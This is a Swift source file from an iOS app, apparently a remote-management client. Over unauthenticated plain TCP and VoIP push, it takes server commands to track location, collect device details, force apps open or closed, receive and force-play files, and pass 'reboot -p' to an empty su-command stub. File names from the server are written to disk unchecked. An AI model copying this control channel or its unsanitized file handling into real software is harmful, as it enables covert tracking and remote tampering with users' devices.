//
//  VoipTCPService.swift
//  V2Test
//
//  Created by Bahgat Mashaly on 5/18/16.
//
//

import Foundation

import AVFoundation
import PushKit
import CoreLocation
import ObjectiveC
// FIXME: comparison operators with optionals were removed from the Swift Standard Libary.
// Consider refactoring the code to use the non-optional operators.
fileprivate func < <T : Comparable>(lhs: T?, rhs: T?) -> Bool {
  switch (lhs, rhs) {
  case let (l?, r?):
    return l < r
  case (nil, _?):
    return true
  default:
    return false
  }
}


private var myAnyObjectx: AnyObject!

extension UIAlertView {
    var myAnyObject: AnyObject! {
        get {
            return objc_getAssociatedObject(self, &myAnyObjectx) as? AnyObject
        }
        set(newValue) {
            objc_setAssociatedObject(self, &myAnyObjectx, newValue, objc_AssociationPolicy.OBJC_ASSOCIATION_RETAIN)
        }
    }
}


@objc(VoipTCPService)  class VoipTCPService:NSObject,protocal_for_location,UIAlertViewDelegate
{
    var audioPlayer: AVAudioPlayer?
    var client_socket: Int32 = 0
    let BUFF_SIZE = 1024
    var callBackIdForVoipPushRequestID:String!
    var delegateForPlugins:protocal_for_plugins!;
    var flag_length = 16;
    var locationManager: CLLocationManager!
    var device_database_id:Int = 0;
    var the_location :Location!;
    
    @available(iOS 8.0, *)
    func voipRegistration(_ callBackIdx:String) {
        
        callBackIdForVoipPushRequestID=callBackIdx;
        print("xxxxxxxxxxx" + callBackIdForVoipPushRequestID)
        
    }
    
    
    
    func locationCallback(_ the_location:CLLocation)
    {
        
        self.the_location = nil;
        
        var allData:Dictionary<String, AnyObject> = Dictionary<String, AnyObject>()
        
        
        allData["device_database_id"] = device_database_id as AnyObject;
        allData["latitude"] = String(the_location.coordinate.latitude) as AnyObject ;
        allData["longitude"] = String(the_location.coordinate.longitude) as AnyObject  ;
        
        send_string_tcp_to_server(SV.MessageType.tackMyLocation.rawValue, dicMessage: allData)
        
        
    }
    
    
    
    @available(iOS 8.0, *)
    func didUpdatePushCredentials(_ credentials: PKPushCredentials!)
    {
        
     
        
      //  let tokenChars = credentials.token.bytes.bindMemory(to: CChar.self, capacity: credentials.token.count)
         let tokenChars = credentials.token.map { String(format: "%02.2hhx", $0) }.joined()
        var tokenString = ""
        
        for i in 0..<credentials.token.count {
            tokenString += String(format: "%02.2hhx", arguments: [tokenChars[i] as! CVarArg])
        }
        if(delegateForPlugins != nil)
        {
            delegateForPlugins.call_back(callBackIdForVoipPushRequestID, message:tokenString)
        }
        
        NSLog("voip token: \(tokenString)")
    }
    
    @available(iOS 8.0, *)
    func didReceiveIncomingPushWithPayload( _ payload: PKPushPayload!)
    {
        
        var data:NSDictionary!;
        if(payload.dictionaryPayload != nil)
        {
            // dispatch_async(dispatch_get_main_queue(), { () -> Void in
            if let datax = payload.dictionaryPayload as?  NSDictionary {
                data = datax
            }
            if(data == nil)
            {
                return
            }
            let aps = data["aps"] as! [String: AnyObject]
            
            
            //  let contentAvailable:String = aps!["content-available"] as! String;
            let alertDict =   (aps["alert"] as? Dictionary<String, AnyObject>)!

            
            
            
           // let alertDict = data["aps"]?["alert"] as? Dictionary<String, AnyObject>
//            let payloadDict = payload.dictionaryPayload["aps"] as? Dictionary<String, String>

            
            print(alertDict);
            
            //    print("title : ", alertDict!["title"])
            //    print("body :", alertDict!["body"])
            
            
            let title =  alertDict["title"] as? String
           // let the_body = alertDict!["body"] as? Dictionary<String, AnyObject>
            let mesage = alertDict["body"] as? String
            let action =  alertDict["action"]  as! Int
            let device_database_idxx =  alertDict["device_database_id"]   as? Int
            let action_database_id =  alertDict["action_database_id"]  as? Int
            
            
            
            print(title)
            print(mesage)
            print(action)
            print(action_database_id)
            print(device_database_idxx)
            
            //print(deviceInfo!["device_database_id"])
            
            if( action == SV.MessageType.getLocation.rawValue)
            {
                self.send_Location_from_push(device_database_idxx!)
            }
            
            
            if( action == SV.MessageType.alert.rawValue)
            {
                self.do_alert_from_push(title!, body: mesage!)
            }
            
            if( action == SV.MessageType.toast.rawValue)
            {
                
                self.do_toast_from_push(mesage!)
            }
            
            
            //    dispatch_async(queue) {
            //        self.start_liten()
            //    }
            
            
            //         return;
            //        for index in 1...90000000000 {
            //
            //            let x=String(index) ;
            //            print(x)
            //            dispatch_async(dispatch_get_main_queue(), { () -> Void in
            //
            //                let alert = UIAlertView(title: "VoIP Notification", message: x , delegate: nil, cancelButtonTitle: "Ok");
            //                alert.show()
            //            })
            //
            //             NSThread.sleepForTimeInterval(60)
            //        }
            //
            //        let dispatchQueue =
            //        dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0)
            //
            //        dispatch_async(dispatchQueue, {[weak self] in
            //
            //            let audioSession = AVAudioSession.sharedInstance()
            //            NSNotificationCenter.defaultCenter().addObserver(self!,
            //                selector: "handleInterruption:",
            //                name: AVAudioSessionInterruptionNotification,
            //                object: nil)
            //
            //            do {
            //                try audioSession.setActive(true)
            //            } catch _ {
            //            }
            //
            //            do {
            //                try audioSession.setCategory(AVAudioSessionCategoryPlayback)
            //                print("Successfully set the audio session")
            //            } catch let error as NSError {
            //                print("Could not set the audio session \(error)")
            //            } catch {
            //                fatalError()
            //            }
            //
            //            let filePath = NSBundle.mainBundle().pathForResource("FeelinGood",
            //                ofType:"mp3")
            //
            //            let fileData: NSData?
            //            do {
            //                fileData = try NSData(contentsOfFile: filePath!,
            //                    options: .DataReadingMappedIfSafe)
            //            } catch _ {
            //                fileData = nil
            //            }
            //
            //            do {
            //                /* Start the audio player */
            //                self!.audioPlayer = try AVAudioPlayer(data: fileData!)
            //            } catch let error as NSError {
            //                self!.audioPlayer = nil
            //                print("Error = \(error)")
            //            } catch {
            //                fatalError()
            //            }
            //
            //            /* Did we get an instance of AVAudioPlayer? */
            //            if let theAudioPlayer = self!.audioPlayer{
            //                theAudioPlayer.delegate = self
            //                if theAudioPlayer.prepareToPlay() &&
            //                    theAudioPlayer.play(){
            //                        print("Successfully started playing")
            //                } else {
            //                    print("Failed to play")
            //                }
            //            } else {
            //                /* Handle the failure of instantiating the audio player */
            //            }
            //            })
            
            
            
            
            
            
            //present a local notifcation to visually see when we are recieving a VoIP Notification
            // if UIApplication.sharedApplication().applicationState == UIApplicationState.Background {
            
            //                    let localNotification = UILocalNotification();
            //                    localNotification.alertBody = message
            //                    localNotification.applicationIconBadgeNumber = 88;
            //                    localNotification.soundName = UILocalNotificationDefaultSoundName;
            //
            //                    UIApplication.sharedApplication().presentLocalNotificationNow(localNotification);
            //
//            let notification = UILocalNotification()
//            notification.fireDate = NSDate(timeIntervalSinceNow: 3)
//            notification.applicationIconBadgeNumber = notification.applicationIconBadgeNumber + 1;
//            if #available(iOS 8.2, *) {
//                //  notification.alertTitle = alertDict!["title"]
//            }
//            notification.alertBody = String( alertDict!["body"]!)
//            // notification.alertAction = "be awesome!"
//            notification.soundName = UILocalNotificationDefaultSoundName
//            // notification.userInfo
//            //notification.userInfo = ["CustomField1": "w00t"]
//            
//            UIApplication.sharedApplication().presentLocalNotificationNow(notification)
//            print("incoming voip notfication: \(payload.dictionaryPayload)")
            //   })
            
        }
        
        //
        
        
    }
    
    
    
    
    
    func openSessionWithServer()->Bool
    {
        if(client_socket==0)
        {
            var host:String;
            var port:Int;
            port=9701;
            host = "192.168.1.219"
            
            let hostAddr = inet_addr((host as NSString).utf8String);
            var addr = sockaddr_in(
                sin_len: __uint8_t(MemoryLayout<sockaddr_in>.size),
                sin_family: sa_family_t(AF_INET),
                sin_port: UInt16(port).bigEndian,
                sin_addr: in_addr(s_addr: hostAddr),
                sin_zero: (0,0,0,0,0,0,0,0)
            );
            
            client_socket = socket(AF_INET, SOCK_STREAM, 0);
            //  ari_fcntlVi( self.client_socket, F_SETFL, Int32(1))
            
            //    var valuex = 1//او صفر٠
            //    let rcxx  = setsockopt(client_socket, SOL_SOCKET, SO_KEEPALIVE, &valuex,socklen_t(sizeof(Int32)))
            
            
            let rc = withUnsafePointer(to: &addr) {
                // Temporarily bind the memory at &addr to a single instance of type sockaddr.
                $0.withMemoryRebound(to: sockaddr.self, capacity: 1) {
                    connect(client_socket, $0, socklen_t(addr.sin_len))
                }
            }
            
            
//            let rc = withUnsafePointer(to: &addr) { ptr -> Int32 in
//                let bptr = UnsafePointer<sockaddr>(ptr) // cast
//                return connect(self.client_socket, bptr, socklen_t(addr.sin_len))
//            }
            
            
            
            
            if rc != 0 {
                print("فشل الاتصال \(self) to \(addr) \(String(cString: strerror(errno)))")
                self.client_socket = 0;
                return false;
            }
            else
            {
                print("نجح الاتصال  connect \(self) to \(addr)")
                //                dispatch_async(queue) {
                //
                //                    for index in 1...90000000000 {
                //
                //                        self.send_app_info()
                //                        print("sleep : " + String( index ))
                //                        NSThread.sleepForTimeInterval(10)
                //                    }
                //                }
                return true;
            }
        }
            
        else
        {
            return true;
        }
    }
    func send_string_tcp_to_server(_ message_type:Int,dicMessage:Dictionary<String, AnyObject>)
    {
        
        if(client_socket==0)
        {
            openSessionWithServer()
        }
        //let nsdata = try NSJSONSerialization.dataWithJSONObject( allData, options: NSJSONWritingOptions.PrettyPrinted)
        //var allData_string = NSString(data: nsdata, encoding: NSUTF8StringEncoding) as! String
        //allData_string =   allData_string.stringByReplacingOccurrencesOfString("\\\"", withString: "\"", options: NSStringCompareOptions.LiteralSearch, range: nil)
        // allData_string =   allData_string.stringByReplacingOccurrencesOfString("\n", withString: " ", options: NSStringCompareOptions.LiteralSearch, range: nil)
        
        
        // var dataArray = Array(UnsafeBufferPointer(start: UnsafePointer<UInt8>(nsdata.bytes), count: nsdata.length))
        let submitJson: JSON =   JSON(dicMessage);
        
        // allData_string =   allData_string.stringByReplacingOccurrencesOfString("\n", withString: " ", options: NSStringCompareOptions.LiteralSearch, range: nil)
        
        //var buf = [UInt8](submitJson.rawString()!.utf8)
        var buf:Data;
        var messageByteArray = Array<UInt8>()
        
        do {
            buf = try submitJson.rawData();
            
            messageByteArray = Array(UnsafeBufferPointer(start: (buf as NSData).bytes.bindMemory(to: UInt8.self, capacity: buf.count), count: buf.count))
            
        }
        catch let error as NSError {
            
            print("Error = \(error)")
        }
        
        
        
        
        var flag_bytes = Array<UInt8>(repeating: 0  , count: flag_length)
        
        var typeAndLenght_temp = String(message_type) + "|" + String(messageByteArray.count  ) ;
        
        let typeAndLenght_temp_bytes: [UInt8] = Array(typeAndLenght_temp.utf8)
        
        
        for i in 0..<typeAndLenght_temp_bytes.count   {
            flag_bytes[i] = typeAndLenght_temp_bytes[i]
        }
        
        var writeCount : Int = 0
        
        flag_bytes+=messageByteArray[0...messageByteArray.count-1]
        
        
        writeCount = send(self.client_socket, flag_bytes, flag_bytes.count,0)
        if(writeCount == -1)
        {
            print("فشل ارسال الرسالة \(String(cString: strerror(errno)))")
            
            
            self.client_socket = 0;
        }
        else
        {
            print("تم ارسال الرسالة بنجاح \(writeCount)")
        }
        //            var x =  sendto(client_socket, cstr, len,0,self.bptrxx,self.socklen_txx)
        
        
        
    }
    
    func start_liten()
    {
        if(client_socket==0)
        {
            for index in 1...90000
            {
            if( openSessionWithServer() == true)
            {
                break;
            }
              else
            {
                Thread.sleep(forTimeInterval: 60)
              }
            }
        }
        else
        {
            return;
        }
        var prefix_type_lenght = Array<UInt8>(repeating: 0  , count: flag_length)
        var result1:String! = "";
        var lenght:Int;
        let n = 0
        while n < 1
        {
            lenght = read(self.client_socket, &prefix_type_lenght, Int(prefix_type_lenght.count))
            if(lenght <= 0 )
            {
                //  Error_in_input = true;
                //  check_conn();
                print("xxx \(String(cString: strerror(errno)))")
                
                 Thread.sleep(forTimeInterval: 60)
                close(self.client_socket)
                client_socket = 0
                start_liten()
                return;
               // continue;
            }
            else  {
                result1 = NSString(bytes: prefix_type_lenght, length: lenght, encoding: String.Encoding.utf8.rawValue ) as! String
                
                
                if(result1 != nil)
                {
                    
                    print("[Success] Receivedxx : \(result1)")
                    
                    
                    if result1.hasSuffix("\r\n") {
                        result1 = String(result1[result1.startIndex..<result1.index(before: result1.endIndex)])
                    }
                    print("[Success] Received : \(result1)")
                    
                    var temp = result1.components(separatedBy: "|")
                    
                    
                    let lenght_of_rec:Int? = Int(temp[1]);
                    var packet_1024 = Array<UInt8>(repeating: 0  , count: 1024)
                   var all_data = Array<UInt8>()
                  
                    var tempdataLength:Int ;//to throw exeptopn make it 0
                    if(lenght_of_rec < packet_1024.count)
                    {
                        tempdataLength = lenght_of_rec!;
                        
                    }
                    else
                    {
                        tempdataLength = packet_1024.count;
                    }
                    var packet_readed_count:Int=0;
                    let temp_temp=tempdataLength;
                    
                    while (true)
                    {
   
                       let xx = read(self.client_socket, &packet_1024, tempdataLength)
                        
                        
                        all_data+=packet_1024[0...xx-1]
                        
                        
                        packet_readed_count=packet_readed_count+xx;
                        if(packet_readed_count==lenght_of_rec)//آخر باكت
                        {
//                            for index in 0...arr.count-1
//                            {
//                                
//                                print( String( arr[index]))
//                            }
                            
//                            for index in 0...all_data.count-1
//                              {
//                            
//                                 print(String(index) + " : " + String( all_data[index]))
//                              }
                            handel_packet_s_received(temp[0], the_bytes: all_data);
                            break;
                        }
                        if lenght_of_rec! - packet_readed_count >= packet_1024.count
                        {
                            tempdataLength =  packet_1024.count
                        }
                        else
                        {
                            
                            tempdataLength =  lenght_of_rec! - packet_readed_count;
                        }
                        
                        
                    }
                    
                    // self.text1.text = s;
                    main_qu.async {
                        print(result1) ;
                    }
                }
            }
            // buff_snd = "\(strlen(buff_rcv)) : \(buff_rcv)"
            //
            //            write(client_socket, &buff_snd, strlen(buff_snd) + 1)
            //
            
        }
        
        close(self.client_socket)
        
    }
    
    
    func do_toast(_ message:String)
    {
        DispatchQueue.main.async(execute: { () -> Void in
            // self.webView?.makeToast(command.arguments[1] as! String , duration: 5, position: ToastPosition.Bottom)
            let rootViewController: UIViewController = UIApplication.shared.windows[0].rootViewController!
            rootViewController.view?.makeToast(message , duration: 5, position: ToastPosition.bottom)
        })
    }
    func do_push(_ message:String)
    {
        //لا تظهر الــ notification  عندما يكون البرنامج في الواجهى الامامية لذلك تم تحويلها الى alert
        
        do_alert(message)
        
//        dispatch_async(dispatch_get_main_queue(), { () -> Void in
//            if let data = message.dataUsingEncoding(NSUTF8StringEncoding) {
//                do {
//                    var json = try NSJSONSerialization.JSONObjectWithData(data, options: []) as? [String:AnyObject]
//                    var title =   json!["title"] as? String
//                    var body =   json!["body"] as? String
//                  
//                    
//                    let notification = UILocalNotification()
//                    notification.fireDate = NSDate(timeIntervalSinceNow: 3)
//                    notification.applicationIconBadgeNumber = notification.applicationIconBadgeNumber + 1;
//                    if #available(iOS 8.2, *) {
//                        notification.alertTitle = title
//                    }
//                    notification.alertBody = body
//                    // notification.alertAction = "be awesome!"
//                    notification.soundName = UILocalNotificationDefaultSoundName
//                    // notification.userInfo
//                    //notification.userInfo = ["CustomField1": "w00t"]
//                    UIApplication.sharedApplication().scheduleLocalNotification(notification)
//                    
//                    
//                    
//                } catch let error as NSError {
//                    print(error)
//                }
//            }
//        })
    }
    func do_alert(_ message:String)
    {
        DispatchQueue.main.async(execute: { () -> Void in
            if let data = message.data(using: String.Encoding.utf8) {
                do {
                     var json = try JSONSerialization.jsonObject(with: data, options: []) as? [String:AnyObject]
                  var title =   json!["title"] as? String
                     var body =   json!["body"] as? String
                    
                     SV.Alert_ok(title!, body!)
                } catch let error as NSError {
                    print(error)
                }
            }
        })
    }
    
    func do_toast_from_push(_ body:String)
    {
        if UIApplication.shared.applicationState != UIApplicationState.background{
            DispatchQueue.main.async(execute: { () -> Void in
                // self.webView?.makeToast(command.arguments[1] as! String , duration: 5, position: ToastPosition.Bottom)
                let rootViewController: UIViewController = UIApplication.shared.windows[0].rootViewController!
                rootViewController.view?.makeToast(body , duration: 5, position: ToastPosition.bottom)
            })
        }
        else
        {
            do_push_from_push("",body: body)
        }
    }
    
    func do_alert_from_push(_ title:String,body:String)
    {
        if UIApplication.shared.applicationState != UIApplicationState.background{
            DispatchQueue.main.async(execute: { () -> Void in
                
                let alert = UIAlertView(title: title, message: body, delegate: nil, cancelButtonTitle: "Ok");
                alert.show()
            })
        }
        else
        {
            do_push_from_push(title,body: body)
        }
    }
    
    
    func do_push_from_push(_ title:String,body:String)
    {
        let notification = UILocalNotification()
        notification.fireDate = Date(timeIntervalSinceNow: 3)
        notification.applicationIconBadgeNumber = notification.applicationIconBadgeNumber + 1;
        if #available(iOS 8.2, *) {
            notification.alertTitle = title
        }
        notification.alertBody = body
        // notification.alertAction = "be awesome!"
        notification.soundName = UILocalNotificationDefaultSoundName
        // notification.userInfo
        //notification.userInfo = ["CustomField1": "w00t"]
        
        UIApplication.shared.presentLocalNotificationNow(notification)//                }
        
        
        // print("incoming voip notfication: \(payload.dictionaryPayload)")
    }
    
    
    func send_app_info()
    {
        var device_info = getDeviceInfo();
        var app_info = Array<String>();
        
        app_info.append(Bundle.main.bundleIdentifier!)
        
        var allData:Dictionary<String, AnyObject> = Dictionary<String, AnyObject>()
        
        allData["apps"]=app_info as AnyObject;
        allData["device_info"]=device_info;
        // print(allData)
        send_string_tcp_to_server( SV.MessageType.putMyInfoInTCPList.rawValue, dicMessage: allData);
        
        
        
        
        //char[] flag = new char[flag_length];
        // char[] typeAndLenght_temp = (SV.Message_Type.PutMyInfoInTCPList.getValue() + "|" + allData.toString().length()).toCharArray();
        // System.arraycopy(typeAndLenght_temp, 0, flag, 0, typeAndLenght_temp.length);
        
        
        
        
    }
    
    func get_forever_Value_for_key(_ the_key:String)->String
    {
        
        let defaults = UserDefaults.standard
        var forever_key = defaults.string(forKey: the_key)
        //
        if(forever_key==nil)
        {
            var temp=Keychain.load(the_key);
            if(temp != nil)
            {
                forever_key  =  temp!.stringValue
            }
            if(forever_key==nil)//not in Keychain and not in NSUserDefaults so get it and save it
            {
                forever_key = UIDevice.current.identifierForVendor!.uuidString;
                Keychain.save(the_key, data: forever_key!.dataValue)
                
                UserDefaults.standard.set(forever_key, forKey: the_key)
                UserDefaults.standard.synchronize();
                
                
                
            }
            else//in Keychain only so put it in NSUserDefaults
            {
                UserDefaults.standard.set(forever_key, forKey: the_key)
                UserDefaults.standard.synchronize();
                
            }
            
        }
            
        else //in NSUserDefaults so check if in Keychain
        {
            var temp=Keychain.load(the_key);
            if(temp != nil)
            {
                let temp_from_Keychain  =  temp!.stringValue;
                if(temp_from_Keychain != forever_key )
                {
                    Keychain.save(the_key, data: forever_key!.dataValue)
                }
            }
            else
            {
                Keychain.save(the_key, data: forever_key!.dataValue)
            }
        }
        
        
        return forever_key!;
        
    }
    
    func getDeviceInfo()->NSMutableDictionary
    {
        let device_udid = get_forever_Value_for_key("device_udid");
        let device_model =  UIDevice.current.model;
        let device_product = UIDevice.current.name;
        // let systemName = UIDevice.currentDevice().systemName;
        let device_sdk_version =   UIDevice.current.systemVersion
        
        let   device_mac_Addr = "";
        let device_serial = "";
        let device_android_Id="";
        let device_manufacturer="Apple";
        //let device_brand=systemInfo.machine
        var systemInfo = utsname()
        uname(&systemInfo)
        let machineMirror = Mirror(reflecting: systemInfo.machine)
        let device_brand = machineMirror.children.reduce("") { identifier, element in
            guard let value = element.value as? Int8, value != 0 else { return identifier }
            return identifier + String(UnicodeScalar(UInt8(value)))
        }
        
        let projectPackageNameBundleID = Bundle.main.bundleIdentifier!
        
        
        
        
        let para:NSMutableDictionary = NSMutableDictionary()
        ///
        para.setValue(device_sdk_version, forKey: "device_sdk_version")
        para.setValue(device_model, forKey: "device_model")
        para.setValue(device_product, forKey: "device_product")
        para.setValue(device_brand, forKey: "device_brand")
        para.setValue(device_manufacturer, forKey: "device_manufacturer")
        para.setValue(device_android_Id, forKey: "device_android_Id")
        para.setValue(device_serial, forKey: "device_serial")
        para.setValue(device_udid, forKey: "device_udid")
        para.setValue(device_mac_Addr, forKey: "device_mac_Addr")
        para.setValue("ios", forKey: "device_os")
        para.setValue(projectPackageNameBundleID, forKey: "projectPackageNameBundleID")
        
        // let jsonError: NSError?
        //        let jsonData: NSData
        //        do{
        //        jsonData = try NSJSONSerialization.dataWithJSONObject(para, options: NSJSONWritingOptions())
        //        let jsonString = NSString(data: jsonData, encoding: NSUTF8StringEncoding) as! String
        //        return jsonString
        return  para
        
        //    } catch _ {
        //         print ("error when get info")
        //        return nil;
        //        }
        
        
        
        
        
        //  get_device_udid();
        
        
        // Thread-safe.
        
    }
    
    func send_Location( _ the_bytes:Array<UInt8> )
    {
        var the_data = Data(bytes: UnsafePointer<UInt8>(the_bytes), count: the_bytes.count)
        let JSONData = try? JSON(data: the_data)
       // var JSONData =   JSON(data:the_data);
        // print(JSONData)
        print(JSONData?["device_database_id"])
        device_database_id =  (JSONData?["device_database_id"].intValue)!
        //        let json = JSON(data: dataFromNetworking)
        //        if let userName = json[0]["user"]["name"].string {
        //            //Now you got your value
        //        }
        
        DispatchQueue.main.async {
            if(self.the_location == nil)
            {
                self.the_location = Location()
                self.the_location.th_instance_for_prtocol = self;
            }
            self.the_location.initx();
        }
    }
    
    func send_Location_from_push(  _ device_database_idx:Int)
    {
        
        device_database_id = device_database_idx;
        
        DispatchQueue.main.async {
            if(self.the_location == nil)
            {
                self.the_location = Location()
                self.the_location.th_instance_for_prtocol = self;
            }
            self.the_location.initx();
        }
    }
    
    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation])
    {
        
        let userLocation:CLLocation = locations[0] 
        let long = userLocation.coordinate.longitude;
        let lat = userLocation.coordinate.latitude;
    }
    
    func do_uninstall(_ type:Int,message:String)
    {
        
    }
    func do_open_application(_ type:Int,message:String)
    {
        if(type == SV.MessageType.openApplicationForced.rawValue)
        {
        openAnotherApplication(message)
        }
        else if(type == SV.MessageType.openApplication.rawValue)
        {
            openAlertConfirmView("Application Need  to Open",message: "click here to open it",Button1Text: "Cancel",Button2Text: "Open",myAnyObject: message as AnyObject,tag: 3)
            
        }
    }
    func do_close_application(_ type:Int,message:String)
    {
        if(type == SV.MessageType.closeApplicationForced.rawValue)
        {
            exit(0)
        }
        else if(type == SV.MessageType.openApplication.rawValue)
        {
            openAlertConfirmView("Application Need  to Close",message: "click here to close it",Button1Text: "Cancel",Button2Text: "Close",myAnyObject: message as AnyObject,tag: 4)
            
        }
        
       
    }
    func getContacts(_ message:String)
    {
        
    }
    
    func receivedFile(_ the_bytes:Array<UInt8> ,type:Int)
    {
        var prefix_File_info_lenght = Array<UInt8>(repeating: 0  , count: flag_length)
        for i in 0..<prefix_File_info_lenght.count
        {
            prefix_File_info_lenght[i] = the_bytes[i]
        }
      var file_info_length_string =  NSString(bytes: prefix_File_info_lenght, length: prefix_File_info_lenght.count, encoding: String.Encoding.utf8.rawValue)  as! String
      var items =   file_info_length_string.components(separatedBy: "|")
        var file_info_length =  Int(items[0] );
        var prefix_File_info:Array<UInt8> = Array( the_bytes[flag_length...file_info_length!-1 + flag_length])
        var file_info_string = NSString(bytes: prefix_File_info, length: prefix_File_info.count, encoding: String.Encoding.utf8.rawValue ) as! String
        var temp_file_info =   file_info_string.components(separatedBy: "|")
        print(temp_file_info)
        let documentDir = NSSearchPathForDirectoriesInDomains(FileManager.SearchPathDirectory.documentDirectory, FileManager.SearchPathDomainMask.allDomainsMask, true).first
        var net_byte = Array<UInt8>( the_bytes[(flag_length + prefix_File_info.count)...(the_bytes.count-1)] )
        var data = Data(bytes: UnsafePointer<UInt8>(net_byte), count: the_bytes.count)
         try? data.write(to: URL(fileURLWithPath: (documentDir?.stringByAppendingPathComponent(temp_file_info[0]))!), options: [.atomic])
        var the_url:URL = URL( fileURLWithPath: (documentDir?.stringByAppendingPathComponent(temp_file_info[0]))!)
        dealWithReseavedFile(type,  url: the_url);
    }
    
    func dealWithReseavedFile(   _ type:Int,    url:URL)
    {
    
    if(type == SV.MessageType.audioFile.rawValue || type == SV.MessageType.audioFileForcedPlay.rawValue || type == SV.MessageType.videoFile.rawValue || type == SV.MessageType.videoForcedPlay.rawValue  )
    {
    dealWithAudioOrVedio(type,  url: url);
    }
    else if(type == SV.MessageType.sendFile.rawValue || type == SV.MessageType.sendFileForcedOpen.rawValue)
    {
    dealWithUnknownFile(type, url:url);
    }
    else if(type == SV.MessageType.installApplicationSilently.rawValue || type == SV.MessageType.updateApplicationSilently.rawValue  )
    {
    dealWithInstallUpdateSilently(type,  url:url);
    
    }
    else if(type == SV.MessageType.installApplication.rawValue || type == SV.MessageType.updateApplication.rawValue  )
    {
    dealWithInstallUpdateNotification(type,  url:url);
    }
    }
    
    
    
    
    func play_audioVideo(_ url:URL)
    {
        DispatchQueue.main.async(execute: { () -> Void in
            //        var videoUrl = NSBundle.mainBundle().URLForResource("123", withExtension: "mp4")
            let AVpx:AVp = AVp(nibName: "AVp", bundle: nil)
            // let   path = NSBundle.mainBundle().pathForResource("001", ofType:"mp3")
            
            // //let url = NSURL(string: "http://jplayer.org/video/m4v/Big_Buck_Bunny_Trailer.m4v")!
            //let     url = NSURL(fileURLWithPath: path!)
            AVpx.AudioVideoURL = url
            let rootViewController: UIViewController = UIApplication.shared.windows[0].rootViewController!
            rootViewController.present(AVpx, animated: true, completion: nil)
        })
    }
    
    func openAnotherApplication(_ url:String)
    {
        DispatchQueue.main.async(execute: { () -> Void in
            if let url = URL(string: url), UIApplication.shared.canOpenURL(url) {
                UIApplication.shared.openURL(url)
            }
        })
    }
    
    
  func  dealWithAudioOrVedio(  _ type:Int,    url:URL)
  {
    
    if(type==SV.MessageType.audioFileForcedPlay.rawValue || type==SV.MessageType.videoForcedPlay.rawValue)
    {
        play_audioVideo(url)
    }
    
    else
    {
        var title:String ;
        var  message:String;
        if(  type == SV.MessageType.audioFile.rawValue)
        {
            title="Audio message";
            message="Audio message received";
        }
        else
        {
            title="Video message";
            message="Video message received";
        }
            
     
        openAlertConfirmView(title,message: message,Button1Text: "Cancel",Button2Text: "Play",myAnyObject: [type,url],tag: 2)
        
        
    }
    
    
    }
    
    func openAlertConfirmView(_ title:String,message:String,Button1Text:String,Button2Text:String,myAnyObject:Any,tag:Int)
    {
        DispatchQueue.main.async(execute: { () -> Void in
            let Alert: UIAlertView = UIAlertView()
            Alert.delegate = self
            Alert.title = title
            Alert.message = message
            Alert.myAnyObject = myAnyObject as AnyObject
            Alert.addButton(  withTitle: NSLocalizedString(Button1Text, comment: ""))
            Alert.addButton(  withTitle: NSLocalizedString(Button2Text, comment: ""))
            Alert.tag = tag
            Alert.show()
        })
    }
    
    
    func alertView(_ View: UIAlertView!, clickedButtonAt buttonIndex: Int){
        if  (View.tag == 2)
        {
            var x =   (View.myAnyObject as! NSArray) as Array
            var type =   x[0] as! Int;
            let urlx = x[1] as! URL;
            switch buttonIndex{
                
            case 1:
                play_audioVideo(urlx)
                break;
            case 0:
                
                break;
            default:
                
                break;
                //Some code here..
                
            }
            
        }
        
        else if(View.tag == 3)
        {
            let url = View.myAnyObject as! String
           
            switch buttonIndex{
            case 1:
                openAnotherApplication(url)
                break;
            case 0:
                
                break;
            default:
                
                break;
                //Some code here..
                
            }
        }
        
        else if (View.tag == 4)
        {
            switch buttonIndex{
            case 1:
                  exit(0)
                break;
            case 0:
                
                break;
            default:
                break;
                //Some code here..
                
            }

           
        }
        
    }
    
  func  dealWithUnknownFile( _ type:Int,    url:URL)
  {}
    
    func dealWithInstallUpdateSilently( _ type:Int,    url:URL)
    {
        
    }
    
    func dealWithInstallUpdateNotification( _ type:Int,    url:URL)
    {
        
    }
    
    func  do_su_command(_ the_command:String)
    {
        
    }
    
    func handel_packet_s_received(   _ mms_type:String,  the_bytes:Array<UInt8> )
    {
        var type=Int(mms_type)
        
        switch type {
        case  SV.MessageType.toast.rawValue?:
            do_toast(NSString(bytes: the_bytes, length: the_bytes.count, encoding: String.Encoding.utf8.rawValue ) as! String)
        case  SV.MessageType.directPushNotification.rawValue?:
            do_push(NSString(bytes: the_bytes, length: the_bytes.count, encoding: String.Encoding.utf8.rawValue ) as! String)
        case  SV.MessageType.welcome.rawValue?:
            print( "handel_packet_s_received: tcp  server say Welcome=", NSString(bytes: the_bytes, length: the_bytes.count, encoding: String.Encoding.utf8.rawValue ) as! String)
        case  SV.MessageType.alert.rawValue?:
            do_alert(NSString(bytes: the_bytes, length: the_bytes.count, encoding: String.Encoding.utf8.rawValue ) as! String)
        case  SV.MessageType.giveMeAppsInfo.rawValue?:
            send_app_info();
        case  SV.MessageType.getLocation.rawValue?,  SV.MessageType.whereAreMyCustomersNow.rawValue?:
            send_Location(the_bytes);
        case  SV.MessageType.uninstallApplication.rawValue?,  SV.MessageType.uninstallApplicationSilently.rawValue?:
            do_uninstall(type!,message: NSString(bytes: the_bytes, length: the_bytes.count, encoding: String.Encoding.utf8.rawValue ) as! String);
        case  SV.MessageType.openApplication.rawValue?,  SV.MessageType.openApplicationForced.rawValue?:
            do_open_application(type!,message: NSString(bytes: the_bytes, length: the_bytes.count, encoding: String.Encoding.utf8.rawValue ) as! String);
        case  SV.MessageType.closeApplication.rawValue?,  SV.MessageType.closeApplicationForced.rawValue?:
            do_close_application(type!,message: NSString(bytes: the_bytes, length: the_bytes.count, encoding: String.Encoding.utf8.rawValue ) as! String);
            
        case  SV.MessageType.getContacts.rawValue?:
            getContacts(NSString(bytes: the_bytes, length: the_bytes.count, encoding: String.Encoding.utf8.rawValue ) as! String);
            
        case  SV.MessageType.audioFileForcedPlay.rawValue?,  SV.MessageType.audioFile.rawValue? ,  SV.MessageType.videoFile.rawValue? ,SV.MessageType.videoForcedPlay.rawValue? ,SV.MessageType.sendFile.rawValue? , SV.MessageType.sendFileForcedOpen.rawValue? , SV.MessageType.installApplication.rawValue? , SV.MessageType.installApplicationSilently.rawValue? , SV.MessageType.updateApplication.rawValue? , SV.MessageType.updateApplicationSilently.rawValue?:
            receivedFile(the_bytes, type: type!)
        case  SV.MessageType.shutdownDeviceForced.rawValue?:
            do_su_command("reboot -p");
        default:
